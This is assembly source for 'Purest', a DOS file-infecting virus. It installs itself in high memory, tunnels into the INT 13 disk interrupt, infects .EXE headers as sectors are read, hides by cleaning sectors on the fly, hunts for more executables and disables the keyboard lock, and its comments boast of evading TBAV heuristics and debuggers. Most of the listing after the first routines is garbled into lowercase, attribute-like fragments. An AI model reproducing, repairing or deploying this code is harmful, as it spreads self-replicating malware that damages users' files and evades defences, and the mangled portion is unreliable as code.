

cseg            segment para    public  'code'
purest          proc    near
assume          cs:cseg

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

;designed by "Q" the misanthrope.

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

;tasm purest /m3
;tlink purest /t

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

.186

ABORT           equ     002h
ALLOCATE_HMA    equ     04a02h
CLOSE_HANDLE    equ     03e00h
COMMAND_8042    equ     064h
COMMAND_LINE    equ     080h
COM_OFFSET      equ     00100h
CRITICAL_INT    equ     024h
DATA_REGISTER   equ     060h
DENY_NONE       equ     040h
DONT_SET_OFFSET equ     006h
DONT_SET_TIME   equ     040h
DOS_INT         equ     021h
DOS_SET_INT     equ     02500h
EIGHT_BYTES     equ     008h
ENVIRONMENT     equ     02ch
EXEC_PROGRAM    equ     04b00h
EXE_SECTOR_SIZE equ     004h
EXE_SIGNATURE   equ     'ZM'
FAR_INDEX_CALL  equ     01effh
FILENAME_OFFSET equ     0001eh
FILE_OPEN_MODE  equ     002h
FIND_FIRST      equ     04e00h
FIND_NEXT       equ     04f00h
FIRST_FCB       equ     05ch
FLUSH_BUFFERS   equ     00d00h
FOUR_BYTES      equ     004h
GET_DTA         equ     02f00h
GET_ERROR_LEVEL equ     04d00h
HARD_DISK_ONE   equ     081h
HIDDEN          equ     002h
HIGH_BYTE       equ     00100h
HMA_SEGMENT     equ     0ffffh
INT_13_VECTOR   equ     0004ch
JOB_FILE_TABLE  equ     01220h
KEEP_CF_INTACT  equ     002h
MAX_SECTORS     equ     078h
MULTIPLEX_INT   equ     02fh
NEW_EXE_HEADER  equ     00040h
NEW_EXE_OFFSET  equ     018h
NULL            equ     00000h
ONLY_READ       equ     000h
ONLY_WRITE      equ     001h
ONE_BYTE        equ     001h
OPEN_W_HANDLE   equ     03d00h
OVERRIDE_LOCK   equ     04bh
PARAMETER_TABLE equ     001f1h
PORT_HAS_DATA   equ     002h
READ_A_SECTOR   equ     00201h
READ_ONLY       equ     001h
READ_W_HANDLE   equ     03f00h
REMOVE_NOP      equ     001h
RESIZE_MEMORY   equ     04a00h
ROM_SEGMENT     equ     0f000h
SECOND_FCB      equ     06ch
SECTOR_SIZE     equ     00200h
SETVER_SIZE     equ     018h
SHORT_JUMP      equ     0ebh
SINGLE_STEP     equ     00100h
SINGLE_STEP_INT equ     001h
SIX_BYTES       equ     006h
SIXTEEN_BYTES   equ     010h
STATUS_8042     equ     064h
SYSTEM          equ     004h
SYS_FILE_TABLE  equ     01216h
TERMINATE_W_ERR equ     04c00h
THREE_BYTES     equ     003h
TWENTY_HEX      equ     020h
TWENTY_ONE      equ     015h
TWO_BYTES       equ     002h
VERIFY_2SECTORS equ     00402h
VOLUME_LABEL    equ     008h
WRITE_A_SECTOR  equ     00301h
WRITE_COMMAND   equ     060h
WRITE_W_HANDLE  equ     04000h
XOR_CODE        equ     (SHORT_JUMP XOR (low(EXE_SIGNATURE)))*HIGH_BYTE
PURE_CODE_IS_AT equ     00149h

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

bios_seg        segment at 0f000h               ;just some dummy area that was needed
		org     00000h                  ;to have the compilier make a far jmp
old_int_13_addr label   word                    ;directive EAh later on
bios_seg        ends

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

		org     COM_OFFSET              ;com files seem to always start here
com_code:

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

		jmp     short alloc_memory

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

dummy_exe_head  dw      SIX_BYTES,TWO_BYTES,NULL,TWENTY_HEX,ONE_BYTE,HMA_SEGMENT
		dw      NULL,NULL,NULL,NULL,NULL,TWENTY_HEX
						;simple EXE header that we have imbedded the virii into

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

		org     PURE_CODE_IS_AT         ;here because many exe files have 00's after this location

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ax_cx_di_si_cld proc    near                    ;sets varables for modifying sector
		lea     di,word ptr ds:[bx+PURE_CODE_IS_AT-COM_OFFSET]
ax_cx_si_cld:   call    set_si                  ;get location of code in HMA
set_si:         cld                             ;clear direction
		pop     si                      ;and subtract the offset
		sub     si,word ptr (offset set_si)-word ptr (offset ax_cx_di_si_cld)
		mov     ax,XOR_CODE             ;ah is value to xor MZ to jmp 015C
		mov     cx,COM_OFFSET+SECTOR_SIZE-PURE_CODE_IS_AT                
		das                             ;set zero flag for the compare later on
		ret
ax_cx_di_si_cld endp

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

		org     high(EXE_SIGNATURE)+TWO_BYTES+COM_OFFSET
						;must be here because the MZ 4Dh,5Ah
						;.EXE header identifier gets changed to
						;jmp 015C EAh,5Ah by changing one byte

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

alloc_memory    proc    near                    ;clear disk buffers so reads are done
		mov     di,-1                   ;set it to FFFFh
		mov     ax,ALLOCATE_HMA         ;lets see how much memory is available
		mov     bh,high(SECTOR_SIZE)    ;enough memory for 1 sector or our code
		int     MULTIPLEX_INT           ;in the HMA - ES:DI points to begining
		inc     di                      ;if dos <5.0 or="" no="" hma="" di="" is="" ffffh="" mov="" bx,six_bytes="" ;for="" setting="" int="" 1="" to="" tunnel="" and="" finding="" the="" program="" name="" jz="" find_name="" ;if="" no="" memory="" don't="" install="" alloc_memory="" endp="" ;then="" copy="" it="" to="" es:di="" in="" hma="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" move_to_hma="" proc="" near="" call="" ax_cx_si_cld="" ;get="" varables="" for="" copy="" to="" hma="" rep="" movsb="" ;copy="" it="" to="" the="" hma="" move_to_hma="" endp="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" set_int_13="" proc="" near="" ;setting="" int="" 1="" vectors="" for="" tunnelling="" signature:="" db="" 'q'="" ;must="" leave="" my="" calling="" card="" (it's="" also="" a="" push="" cx)="" pop="" ds="" ;ds="" now="" 0="" push="" word="" ptr="" ds:[bx]="" ;just="" push="" them="" on="" the="" stack="" for="" latter="" mov="" si,offset="" interrupt_one="" ;tbav="" hueristics="" scans="" for="" the="" setting="" of="" the="" tf="" with="" a="" popf="" but="" not="" an="" iret="" so="" purest="" uses="" the="" int="" 1="" routine="" to="" set="" the="" tf="" mov="" word="" ptr="" ds:[bx],cs="" ;remember="" that="" bx="" is="" 0006="" xchg="" word="" ptr="" ds:[bx-two_bytes],si="" mov="" dl,hard_disk_one="" ;drive="" 1="" xchg="" cx,di="" ;cx="" was="" 0,="" di="" was="" last="" byte="" of="" hma="" code="" push="" si="" ;great="" way="" to="" set="" interrupts="" push="" them="" on="" the="" stack="" pushf="" ;save="" the="" flags="" with="" tf="" cleared="" to="" be="" popped="" off="" later="" mov="" ax,verify_2sectors="" ;set="" up="" int="" 13="" to="" perform="" a="" verify="" (non-distructive="" call)="" int="" single_step_int="" ;call="" interrupt="" one="" to="" set="" tf="" (also="" messes="" with="" debuggers)="" push_then_call:="" pushf="" ;push="" flags="" for="" simulated="" int="" 13="" call="" (must="" be="" at="" this="" location)="" dw="" far_index_call,int_13_vector="" popf="" ;restore="" flags="" with="" tf="" not="" set="" pop="" word="" ptr="" ds:[bx-two_bytes]="" pop="" word="" ptr="" ds:[bx]="" ;and="" restore="" int="" 1="" vectors="" back="" set_int_13="" endp="" ;now="" int="" 13="" has="" our="" code="" hooked="" into="" it="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" disable_lock="" proc="" near="" ;small="" payload="" to="" frustrate="" not="" damage="" (can="" be="" replaced="" put="" must="" keep="" bx="" and="" di="" intact)="" mov="" al,write_command="" ;write="" to="" 8042="" keyboard="" controller="" out="" command_8042,al="" get_status:="" in="" al,status_8042="" ;check="" if="" status="" is="" ready="" to="" receive="" command="" test="" al,port_has_data="" ;test="" if="" ready="" for="" next="" command="" loopnz="" get_status="" ;cx="" was="" sufficiently="" large="" enough="" number="" for="" loop="" (cx="" is="" where="" dos="" ends="" in="" hma)="" mov="" al,override_lock="" ;now="" disable="" key="" lock="" out="" data_register,al="" ;talk="" to="" the="" 8042="" keyboard="" controller="" disable_lock="" endp="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" find_name="" proc="" near="" ;now="" lets="" find="" out="" who="" we="" are="" to="" reload="" lds="" ax,dword="" ptr="" cs:[bx+environment-eight_bytes]="" look_for_nulls:="" inc="" bx="" ;ourselves="" to="" see="" if="" we="" are="" cleaned="" on="" the="" fly="" xor="" word="" ptr="" ds:[bx-four_bytes],di="" jnz="" look_for_nulls="" ;the="" plan="" is="" to="" goto="" the="" end="" of="" our="" find_name="" endp="" ;environment="" and="" look="" for="" 2="" nulls="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" open_file="" proc="" near="" ;open="" current="" program="" and="" read="" header="" mov="" ah,high(flush_buffers)="" int="" dos_int="" ;from="" disk="" and="" not="" from="" memory="" push="" bx="" ;to="" see="" if="" the="" header="" was="" restored="" back="" mov="" ch,three_bytes="" ;read="" in="" 768+="" bytes="" of="" header="" push="" ds="" ;save="" the="" program="" name="" on="" the="" stack="" call="" open_n_read_exe="" ;open,="" read="" cx="" bytes,="" close="" file="" ds:bx="" push="" cs="" ;set="" es="" to="" cs="" for="" compare="" of="" sector="" push="" dx="" pop="" bx="" ;get="" varables="" set="" correctly="" for="" compare="" pop="" es="" ;to="" infected="" sector="" call="" convert_back="" ;compare="" them="" and="" convert="" them="" back="" pop="" ds="" ;get="" file="" name="" again="" pop="" dx="" jne="" now_run_it="" ;if="" int="" 13="" converted="" it="" back="" then="" run="" it="" push="" dx="" ;else="" save="" file="" name="" again="" on="" stack="" mov="" ax,open_w_handle+deny_none+only_read="" push="" ds="" call="" call_dos="" ;open="" current="" program="" for="" reads="" (don't="" set="" any="" alarms)="" push="" bx="" ;save="" handle="" int="" multiplex_int="" ;get="" job="" file="" table="" for="" handle="" mov="" dx,sys_file_table="" mov="" bl,byte="" ptr="" es:[di]="" xchg="" ax,dx="" ;done="" like="" this="" for="" anti="" tbav="" hueristic="" scan="" int="" multiplex_int="" ;get="" sft="" of="" handle="" to="" change="" es:di="" mov="" ax,write_w_handle+deny_none+only_write="" mov="" ch,high(sector_size)="" cmpsw="" ;simple="" code="" to="" change="" open="" file="" to="" mov="" dx,offset="" critical_error+com_offset="" stosb="" ;write="" back="" the="" cleaned="" header="" to="" file="" pop="" bx="" ;get="" handle="" again="" int="" dos_int="" ;this="" cleans="" the="" file="" if="" virii="" didn't="" load="" in="" hma="" or="" byte="" ptr="" es:[di+dont_set_offset-three_bytes],dont_set_time="" call="" reclose_it="" ;set="" sft="" to="" not="" change="" file="" date="" and="" time="" at="" close="" pop="" ds="" ;get="" file="" name="" again="" from="" the="" stack="" pop="" dx="" open_file="" endp="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" now_run_it="" proc="" near="" ;setup="" the="" exec="" of="" current="" program="" again="" mov="" ah,high(resize_memory)="" push="" cs="" ;like="" a="" spawned="" file="" mov="" bx,offset="" exec_table="" pop="" es="" ;es="" now="" cs="" int="" dos_int="" ;first="" resize="" memory="" mov="" si,offset="" critical_error+com_offset+parameter_table="" lea="" di,word="" ptr="" ds:[si]="" ;(mov="" di,si)="" set="" di="" to="" where="" 14="" byte="" exec="" table="" is="" to="" be="" made="" xchg="" bx,si="" ;set="" si="" to="" where="" the="" table="" varables="" are="" set_table:="" mov="" ax,exec_program="" ;set="" ax="" for="" file="" execute="" scasw="" ;advance="" 2="" bytes="" in="" destination="" table="" movs="" byte="" ptr="" es:[di],es:[si];fill="" in="" the="" exec="" table="" scasb="" ;move="" a="" byte="" then="" check="" if="" next="" byte="" is="" nonzero="" mov="" word="" ptr="" es:[di],es="" ;need="" to="" put="" the="" segment="" in="" as="" well="" je="" set_table="" ;fill="" in="" the="" code="" segment="" into="" table="" and="" jmp="" if="" still="" zero="" call="" call_dos="" ;exec="" program="" again="" mov="" dx,offset="" exe_file_mask="" ;look="" for="" *.e*="" (.exe's)="" mov="" cx,read_only+hidden+system+volume_label="" mov="" ax,find_first="" ;need="" to="" infect="" more="" exe="" files="" find_next_file:="" call="" call_dos="" ;set="" cx="" to="" 15="" to="" loop="" that="" many="" times="" mov="" ah,high(get_dta)="" ;what="" was="" the="" old="" dta="" no="" need="" to="" set="" up="" a="" new="" one="" int="" dos_int="" ;get="" it="" push="" es="" ;get="" the="" filename="" into="" ds:bx="" lea="" bx,word="" ptr="" ds:[bx+filename_offset]="" pop="" ds="" ;point="" to="" the="" filename="" call="" open_n_read_exe="" ;open,="" read="" cx="" bytes,="" close="" file="" ds:bx="" mov="" ah,high(find_next)="" loop="" find_next_file="" ;loop="" until="" no="" more="" matches="" done:="" mov="" ah,high(get_error_level)="" int="" dos_int="" ;get="" spawned="" childs="" program="" errorlevel="" mov="" ah,high(terminate_w_err)="" now_run_it="" endp="" ;and="" return="" with="" that="" same="" errorlevel="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" call_dos="" proc="" near="" ;routine="" to="" call="" dos="" int="" dos_int="" ;call="" dos="" xchg="" ax,bx="" ;set="" bx="" to="" ax="" for="" open="" file="" stuff="" jc="" done="" ;error="" in="" doing="" so="" then="" exit="" push="" cs="" ;set="" ds="" to="" cs="" mov="" ax,job_file_table="" ;get="" job="" file="" table="" (done="" here="" for="" anti="" tbav="" hueristic="" scan)="" pop="" ds="" ;for="" all="" sorts="" of="" stuff="" ret="" ;go="" back="" to="" where="" you="" once="" belonged="" call_dos="" endp="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" convert_to="" proc="" near="" ;will="" convert="" sector="" ds:bx="" into="" virii="" infected="" pusha="" ;save="" varables="" onto="" stack="" stc="" ;say="" that="" we="" failed="" mov="" ax,exe_signature="" ;done="" this="" way="" for="" anti="" tbav="" hueristic="" scan="" pushf="" ;push="" flags="" onto="" the="" stack="" cmp="" ax,word="" ptr="" ds:[bx]="" ;if="" not="" an="" exe="" header="" then="" not="" interested="" jne="" not_exe_header="" ;is="" size="" of="" exe="" small="" enough="" to="" run="" as="" a="" com="" file="" cmp="" word="" ptr="" ds:[bx+exe_sector_size],max_sectors="" ja="" not_exe_header="" ;if="" not="" then="" not="" interested="" cmp="" word="" ptr="" ds:[bx+exe_sector_size],setver_size="" je="" not_exe_header="" ;was="" the="" file="" the="" length="" of="" setver.exe="" if="" so="" then="" not="" interested="" (won't="" load="" correctly="" in="" config.sys="" if="" setver.exe="" is="" infected)="" cmp="" word="" ptr="" ds:[bx+new_exe_offset],new_exe_header="" jae="" not_exe_header="" ;was="" it="" a="" new="" exe="" header="" (windows="" etc)="" if="" so="" then="" not="" interested="" call="" ax_cx_di_si_cld="" ;get="" all="" them="" varables="" pusha="" ;save'em="" repe="" scasb="" ;was="" there="" nothin="" but="" 00's="" at="" offset="" 71="" to="" 512="" of="" the="" sector="" popa="" ;get'em="" again="" jne="" not_exe_header="" ;if="" not="" then="" not="" interested="" xor="" byte="" ptr="" ds:[bx],ah="" rep="" movs="" byte="" ptr="" es:[di],cs:[si]="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" exe_file_mask="" db="" '*.e*',null="" ;.exe="" file="" mask="" (doesn't="" need="" to="" be="" specific)="" also="" anti="" tbav="" hueristic="" scan="" ;put="" in="" the="" middle="" of="" this="" routine="" to="" confuse="" the="" hell="" out="" of="" the="" person="" debugging="" it="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" exec_table="" db="" command_line,first_fcb,second_fcb="" ;these="" are="" used="" to="" create="" the="" 14="" byte="" exec="" ;table="" to="" rerun="" program="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" popf="" ;if="" all="" criteria="" were="" met="" for="" infection="" then="" modify="" sector="" in="" memory="" and="" insert="" virii="" clc="" ;pop="" off="" the="" flags="" pushf="" ;and="" push="" on="" the="" passed="" indicator="" not_exe_header:="" popf="" ;get="" passed/failed="" indicator="" popa="" ;get="" varables="" from="" stack="" not_pure:="" ret="" ;go="" back="" to="" where="" you="" once="" belonged="" convert_to="" endp="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" open_n_read_exe="" proc="" near="" ;opens="" file="" at="" ds:bx="" reads="" cx="" bytes="" then="" closes="" mov="" ax,open_w_handle+deny_none+only_read="" lea="" dx,word="" ptr="" ds:[bx]="" ;(mov="" dx,bx)="" for="" dos="" call="" to="" open="" file="" call="" call_dos="" ;just="" open="" it="" for="" reading="" (don't="" sound="" any="" alarms)="" mov="" ax,dos_set_int+critical_int="" mov="" dx,offset="" critical_error="" int="" dos_int="" ;see="" that="" the="" call_dos="" set="" ds="" to="" cs="" for="" setting="" critical="" error="" handler="" mov="" ah,high(read_w_handle)="" inc="" dh="" ;just="" some="" dummy="" area="" outside="" in="" the="" heap="" to="" read="" the="" header="" of="" the="" file="" to="" int="" dos_int="" ;read="" it="" reclose_it:="" mov="" ah,high(close_handle)="" jmp="" short="" call_dos="" ;goto="" close="" it="" open_n_read_exe="" endp="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" convert_back="" proc="" near="" ;will="" convert="" virii="" sector="" es:bx="" back="" to="" clean="" sector="" call="" ax_cx_di_si_cld="" ;get="" all="" them="" varables="" repe="" cmps="" byte="" ptr="" cs:[si],es:[di]="" jne="" not_pure="" ;does="" it="" compare="" byte="" for="" byte="" with="" our="" code="" xor="" byte="" ptr="" ds:[bx],ah="" call="" ax_cx_di_si_cld="" ;if="" it="" does="" change="" the="" jmp="" 015c="" to="" an="" mz="" exe="" header="" signature="" rep="" stosb="" ;and="" zero="" out="" all="" the="" code="" ret="" ;go="" back="" to="" where="" you="" once="" belonged="" convert_back="" endp="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" interrupt_one="" proc="" far="" ;trace="" interrupt="" to="" imbed="" into="" int="" 13="" chain="" at="" ffff:????="" cmp="" ax,verify_2sectors="" ;and="" also="" set="" the="" tf="" to="" start="" jumping="" to="" this="" code="" to="" tunnel="" through="" int="" 13="" jne="" interrupt_ret="" ;if="" not="" doing="" int="" 13="" stuff="" just="" leave="" pusha="" ;push="" varables="" on="" stack="" push="" sp="" pop="" bp="" ;make="" bp="" the="" sp="" push="" ds="" ;purest="" will="" pull="" the="" instruction="" off="" the="" stack="" that="" is="" executed="" next="" lds="" si,dword="" ptr="" ss:[bp+sixteen_bytes]="" cmp="" word="" ptr="" ds:[si+one_byte],far_index_call="" jne="" go_back="" ;compare="" the="" instruction="" to="" a="" far="" call="" function="" cmp="" si,offset="" push_then_call;is="" it="" called="" to="" the="" set="" tf="" active="" from="" the="" set_int_13="" above="" mov="" si,word="" ptr="" ds:[si+three_bytes]="" je="" toggle_tf="" ;if="" so="" then="" set="" it="" active="" cmp="" byte="" ptr="" ds:[si+three_bytes],high(rom_segment)="" jb="" go_back="" ;compare="" the="" address="" of="" the="" call="" to="" segment="" ffffh="" cld="" ;if="" match="" then="" cx="" is="" pointing="" to="" the="" far="" call="" eah="" at="" mov="" di,cx="" ;the="" end="" of="" virii="" that="" needs="" to="" be="" updated="" movsw="" ;move="" the="" address="" to="" our="" code="" std="" ;set="" si="" and="" di="" back="" and="" still="" do="" move="" movsw="" ;far="" addresses="" are="" 4="" bytes="" long="" sub="" di,bx="" ;subtract="" 6="" (bx)="" from="" di="" to="" point="" to="" cmp="" ah,02h="" at="" the="" bottom="" of="" the="" virii="" mov="" word="" ptr="" ds:[si],di="" ;store="" the="" address="" of="" where="" to="" jump="" into="" the="" purest="" code="" mov="" word="" ptr="" ds:[si+two_bytes],es="" toggle_tf:="" xor="" byte="" ptr="" ss:[bp+twenty_one],high(single_step)="" go_back:="" pop="" ds="" ;toggle="" single="" step="" tf="" flag="" to="" be="" popped="" off="" during="" the="" iret="" popa="" ;pop="" off="" varables="" critical_error:="" mov="" al,abort="" ;set="" al="" to="" abort="" for="" critical="" error="" handler="" (al="" is="" an="" abort="" 02h="" anyway="" from="" above="" code="" ax="" verify_2sectors="" 0402h)="" interrupt_ret:="" iret="" ;dual="" useage="" of="" iret.="" critical="" error="" and="" int="" 1="" interrupt_one="" endp="" ;after="" running="" int="" 1="" routine="" through="" an="" int="" 13="" chain="" we="" should="" be="" hooked="" in="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" interrupt_13="" proc="" far="" ;will="" read="" the="" sectors="" at="" es:bx="" and="" infect="" them="" if="" necessary="" and="" or="" clean="" them="" on="" the="" fly="" cmp="" ah,high(verify_2sectors)="" ja="" call_old_int_13="" ;if="" otherwise="" then="" go="" to="" old="" int="" 13="" push="" ds="" ;save="" ds="" push="" es="" ;so="" we="" can="" make="" ds="" the="" same="" as="" es="" and="" save="" a="" few="" bytes="" pop="" ds="" call="" convert_to="" ;try="" to="" convert="" it="" to="" a="" virii="" sector="" pushf="" ;set="" up="" for="" interrupt="" simulation="" push="" cs="" ;push="" the="" cs="" onto="" the="" stack="" for="" the="" iret="" call="" call_old_int_13="" ;if="" command="" was="" to="" write="" then="" an="" infected="" write="" occured="" else="" memory="" got="" overwritten="" with="" the="" read="" pushf="" ;save="" the="" result="" of="" the="" int="" 13="" call="" call="" convert_to="" ;does="" it="" need="" to="" be="" converted="" to="" a="" virii="" sector="" pusha="" ;save="" the="" varables="" onto="" the="" stack="" jc="" do_convertback="" ;if="" not="" then="" see="" if="" it="" needs="" cleaning="" pushf="" ;now="" lets="" write="" the="" virii="" infected="" sector="" back="" to="" disk="" push="" cs="" ;simulate="" an="" int="" 13="" execution="" mov="" ax,write_a_sector="" call="" call_old_int_13="" ;and="" do="" it="" do_convertback:="" call="" convert_back="" ;does="" the="" sector="" need="" to="" be="" cleaned="" on="" the="" fly="" popa="" ;if="" it="" just="" wrote="" to="" the="" disk="" then="" it="" will="" need="" to="" be="" cleaned="" popf="" ;or="" if="" it="" is="" a="" virii="" infected="" sector="" then="" clean="" it="" pop="" ds="" ;pop="" off="" the="" varables="" and="" the="" result="" of="" int="" 13="" simulation="" done="" above="" retf="" keep_cf_intact="" ;then="" leave="" this="" routine="" with="" the="" carry="" flag="" intact="" interrupt_13="" endp="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" org="" com_offset+sector_size-six_bytes="" int_13_entry="" proc="" near="" cmp="" ah,high(read_a_sector)="" ;below="" a="" read="" jae="" interrupt_13="" ;if="" not="" then="" try="" read="" write="" verify="" int_13_entry="" endp="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" org="" com_offset+sector_size-one_byte="" ;must="" be="" a="" far="" jmp="" at="" the="" last="" of="" the="" sector="" ;the="" address="" of="" the="" jmp="" is="" in="" the="" heap="" area="" ;and="" is="" filled="" in="" by="" the="" int="" 1="" trace="" routine="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" call_old_int_13="" proc="" near="" ;far="" call="" to="" actual="" int="" 13="" that="" is="" loaded="" in="" the="" hma="" by="" dos="" jmp="" far="" ptr="" old_int_13_addr="" call_old_int_13="" endp="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" org="" com_offset+sector_size="" ;overwrites="" the="" address="" of="" above="" but="" that="" address="" ;is="" not="" necessary="" until="" the="" virii="" goes="" resident="" in="" the="" hma="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" goto_dos="" proc="" near="" ;this="" is="" our="" simple="" exe="" file="" that="" we="" infected="" mov="" ax,terminate_w_err="" int="" dos_int="" ;terminate="" program="" goto_dos="" endp="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" purest="" endp="" ;close="" up="" and="" go="" home="" cseg="" ends="" end="" com_code=""></5.0>